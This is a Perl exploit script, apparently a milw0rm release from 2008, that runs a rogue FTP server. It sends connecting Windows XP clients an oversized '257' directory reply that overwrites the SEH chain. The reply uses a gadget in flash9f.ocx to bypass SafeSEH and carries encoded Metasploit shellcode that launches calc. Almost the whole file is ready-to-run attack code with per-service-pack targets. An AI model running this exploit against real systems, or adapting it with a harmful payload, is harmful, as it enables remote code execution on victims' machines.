#!/usr/bin/perl
# k`sOSe 08/17/2008
# bypass safeseh using flash9f.ocx.

use warnings;
use strict;
use IO::Socket;

# win32_exec -  EXITFUNC=seh CMD=calc Size=160 Encoder=PexFnstenvSub http://metasploit.com
my $shellcode =	
"\x31\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x6b".
"\xa3\x03\x10\x83\xeb\xfc\xe2\xf4\x97\x4b\x47\x10\x6b\xa3\x88\x55".
"\x57\x28\x7f\x15\x13\xa2\xec\x9b\x24\xbb\x88\x4f\x4b\xa2\xe8\x59".
"\xe0\x97\x88\x11\x85\x92\xc3\x89\xc7\x27\xc3\x64\x6c\x62\xc9\x1d".
"\x6a\x61\xe8\xe4\x50\xf7\x27\x14\x1e\x46\x88\x4f\x4f\xa2\xe8\x76".
"\xe0\xaf\x48\x9b\x34\xbf\x02\xfb\xe0\xbf\x88\x11\x80\x2a\x5f\x34".
"\x6f\x60\x32\xd0\x0f\x28\x43\x20\xee\x63\x7b\x1c\xe0\xe3\x0f\x9b".
"\x1b\xbf\xae\x9b\x03\xab\xe8\x19\xe0\x23\xb3\x10\x6b\xa3\x88\x78".
"\x57\xfc\x32\xe6\x0b\xf5\x8a\xe8\xe8\x63\x78\x40\x03\x53\x89\x14".
"\x34\xcb\x9b\xee\xe1\xad\x54\xef\x8c\xc0\x62\x7c\x08\xa3\x03\x10";

my @targets = ( "\x82\x01\x02\x30", "\x82\x01\x02\x30", "\x0b\x02\x01\x30" );

if( !defined($ARGV[0]) or $ARGV[0] !~ /^(1|2|3)$/ )
{
	usage();
}

$ARGV[0]--;

my $sock = IO::Socket::INET->new( 
					LocalAddr => '0.0.0.0', 
					LocalPort => '21', 
					Listen => 1, 
					Reuse => 1 
					) || die($!);

while(my $csock = $sock->accept())
{

	print $csock "220 Hello ;)\r\n"; 
	read_sock($csock);

	print $csock "331 pwd please\r\n";
	read_sock($csock);

	print $csock "230 OK\r\n";
	read_sock($csock);

	print $csock "250 CWD command successful.\r\n";
	read_sock($csock);

	print $csock	"257 " . "\x22"	. 
			"\x41" x 324 . 

			"\xEB\x06\x90\x90" . # jump ahead
			$targets[$ARGV[0]] . # pop,pop,ret @ flash9f.ocx, thanks macromedia for avoiding /SAFESEH  ;)

			$shellcode .

			"\x90" x 840 .
			"\x22" .
			" is current directory.\r\n";
		
	close($csock);
	exit;
}



sub read_sock
{
	my ($sock) = @_;

	my $buf = <$sock>;

	print "[client] -> $buf";

}

sub usage
{
	print "usage: $0 [1,2,3]
  1 -> Windows XP SP1
  2 -> Windows XP SP2
  3 -> Windows XP SP3\n";
	exit;
}

# milw0rm.com [2008-08-17]